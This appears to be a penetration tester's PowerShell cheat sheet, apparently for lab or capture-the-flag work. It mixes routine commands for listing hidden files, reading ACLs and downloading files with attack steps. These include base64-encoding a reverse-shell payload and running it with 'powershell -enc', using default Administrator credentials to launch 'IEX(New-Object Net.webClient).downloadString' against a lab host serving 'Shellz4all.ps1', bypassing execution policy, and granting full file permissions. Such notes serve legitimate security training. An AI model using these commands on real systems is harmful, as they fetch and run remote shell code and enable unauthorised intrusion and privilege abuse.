# PowerShell

# Windows-like PowerShell Base64 Format
In Kali:
```
cat filename.ps1 | iconv -t UTF-16LE | base64 -w 0
```

# Powershell Execute Reverse Shell
```
powershell -enc <base64-payload>
```
# List hidden files
```
gci -force .
```
# Use Default credentials
```
$SecPass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentList "IEX(New-Object Net.webClient).downloadString('http://10.10.14.30/Shellz4all.ps1')" -Credential $cred
```
# Get File Permissions
```
Get-ACL <filename> | Fl *
```
# Change File Permissions (if you are the owner)
```
cacls <filename> /t /e /p <username>:F
```
- `F`: Full Permission


---

```
powershell -ep bypass
```
## Execution Policy
- Get current Execution Policy
```
Get-ExecutionPolicy -Scope CurrentUser
```

- Set Execution Policy
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```



## Base64 using PowerShell
```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<command>"))
```
- Also, `pwsh` can be used in Linux environment.

## Download
```
Invoke-WebRequest -URI $URL -OutFile $Path
```
```
(New-Object System.Net.WebClient).DownloadFile($URL, $Path)
```
```
Start-BitsTransfer -Source $URL -Destination $Path
```
---
# Print Integrity level of a process
To display the integrity level of a process, we can use tools such as Process Explorer2 or third-party PowerShell modules such as NtObjectManager.3 Let's assume the latter is already installed on the system.

Once we import the module with Import-Module,4 we can use Get-NtTokenIntegrityLevel5 to display the integrity level of the current process by retrieving and reviewing the assigned access token.
```
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```
